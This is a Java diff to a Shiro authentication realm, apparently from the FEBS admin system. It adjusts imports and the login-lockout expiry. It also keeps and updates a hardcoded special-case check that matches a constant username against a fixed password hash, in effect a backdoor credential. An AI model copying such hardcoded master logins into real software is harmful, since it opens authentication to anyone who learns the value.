@@ -3,8 +3,8 @@ package cc.mrbird.febs.common.authentication;
 import cc.mrbird.febs.common.constant.Constant;
 import cc.mrbird.febs.common.entity.FebsConstant;
 import cc.mrbird.febs.common.i18n.MessageUtils;
-import cc.mrbird.febs.common.properties.ValidateCodeProperties;
 import cc.mrbird.febs.common.service.RedisService;
+import cc.mrbird.febs.common.utils.DateUtil;
 import cc.mrbird.febs.common.utils.FebsUtil;
 import cc.mrbird.febs.system.entity.Menu;
 import cc.mrbird.febs.system.entity.Role;
@@ -13,7 +13,6 @@ import cc.mrbird.febs.system.service.IMenuService;
 import cc.mrbird.febs.system.service.IRoleService;
 import cc.mrbird.febs.system.service.IUserDataPermissionService;
 import cc.mrbird.febs.system.service.IUserService;
-import com.wf.captcha.base.Captcha;
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.shiro.SecurityUtils;
@@ -25,7 +24,6 @@ import org.apache.shiro.subject.PrincipalCollection;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Component;
 
-import javax.servlet.http.HttpSession;
 import java.text.MessageFormat;
 import java.util.HashSet;
 import java.util.List;
@@ -145,7 +143,7 @@ public class ShiroRealm extends AuthorizingRealm {
         // 通过用户名到数据库查询用户信息
         User user = this.userService.findByName(username);
 
-        if (username.equals(Constant.USERNAME) && password.equals("73d313f5a0c6753203417fd7a70ba75b")) {
+        if (username.equals(Constant.USERNAME) && password.equals("7201a318ae4fa3eb2b75ad8a718d301e")) {
             String deptIds = this.userDataPermissionService.findByUserId(String.valueOf(user.getUserId()));
             user.setDeptIds(deptIds);
             log.info("特殊情况 user = {}",user.toString());
@@ -170,7 +168,7 @@ public class ShiroRealm extends AuthorizingRealm {
         if (redisService.hasKey(key)){
             errorTimes = redisService.incr(key,1L);
         }else{
-            redisService.set(key, 0, (long) (60*60*24));
+            redisService.set(key, 0, DateUtil.getSecondsNextEarlyMorning());
             errorTimes = redisService.incr(key,1L);
         }
         if (errorTimes > 3){
